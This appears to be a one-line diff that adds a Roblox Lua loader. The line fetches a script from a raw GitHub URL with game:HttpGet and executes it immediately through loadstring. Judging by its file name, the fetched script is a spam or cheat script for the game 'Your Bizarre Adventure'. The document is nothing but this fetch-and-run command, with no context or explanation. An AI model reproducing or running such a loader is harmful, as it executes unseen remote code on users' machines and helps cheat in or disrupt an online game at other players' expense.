@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/your-bizarre-adventure-spam3-aaa8phnxoci4zp.lua"))()
